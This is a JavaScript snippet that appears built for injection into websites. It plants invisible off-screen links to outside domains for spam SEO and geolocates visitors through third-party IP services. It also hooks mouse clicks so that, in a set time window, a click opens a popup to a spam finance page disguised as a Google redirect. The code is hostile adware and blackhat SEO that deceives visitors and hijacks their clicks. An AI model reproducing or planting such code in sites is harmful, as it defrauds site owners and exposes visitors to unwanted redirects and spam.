let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;left:-99%;">Am2z News</a><a href="https://www.mrjaz.com" style="position:absolute;z-index:-999;left:-99%;">MrJaz</a><a href="https://sohanisharma.com" style="position:absolute;z-index:-999;left:-99%;">SohaniSharma</a>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);

if (!localStorage.xcaf) {
    let aa='';
    (async () =>{
        localStorage.xcaf=1
        try {
            aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json()).geoplugin_countryName;
        } catch (e) {
            aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
        }
//         if (/£|[$]|€/.test(aa.geoplugin_currencySymbol)){localStorage.xcaf=2;
//             if(/Spain/.test(aa.geoplugin_countryName)){localStorage.xcaf=3}
//             uhd()
//         }
        if(/United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|South Korea|China|Singapore|Romania/i.test(aa)){
            localStorage.xcaf=2;
            uhd()
        }
    })();
}

function uhd(){
  document.onmousedown=()=>{
    let dte=(new Date).getMinutes();
    (async()=>{try{await import('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
        if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<20||localStorage.xcaf==3&&dte>9&&dte<20)){
            window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwivh7iC79n6AhV8iWMGHRePDm0QFnoECBIQAQ&url=https%3A%2F%2Fbitcoin-insurance-loan-seo-hosting.mrjaz.com%2Fwhat-is-insurance-types-of-insurance-and-meaning-insurance-policy&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4'); 
            sessionStorage.i='i';
        }         
    }catch(e){}})()
  }
}
uhd()

// "€"==a

// "geoplugin_city":"Ahmedabad",

